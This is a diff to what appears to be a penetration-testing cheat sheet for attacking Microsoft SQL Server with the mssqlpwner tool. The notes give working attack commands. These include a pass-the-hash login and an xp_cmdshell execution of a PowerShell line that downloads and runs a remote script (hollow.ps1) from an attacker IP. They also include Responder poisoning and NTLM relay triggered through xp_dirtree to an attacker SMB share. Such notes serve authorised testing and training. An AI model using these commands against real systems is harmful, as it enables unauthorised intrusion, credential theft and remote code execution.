@@ -196,7 +196,7 @@ Get interactive prompt:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
 Execute xp_cmdshell (automation is done by the tool, it will try every variation to get it done)
-- `exec "powershell iex(iwr http://192.168.45.196/hollow.ps1 -useb)"`
+- `exec -command_execution_method (xp_cmdshell/sp_oacreate) "powershell iex(iwr http://192.168.45.196/hollow.ps1 -useb)"`
 
 ### NTLM Relay:
 *Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*
@@ -211,7 +211,7 @@ Fire up Responder
 - `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 
 Trigger SMB authentication:
-- MSSQLPwner: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`
+- MSSQLPwner: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay -relay-method (xp_dirtree/xp_subdirs/xp_fileexist) <OUR ATTACKING MACHINE>`
 - impacket: `xp_dirtree \\192.168.45.196\blabla`
 
 
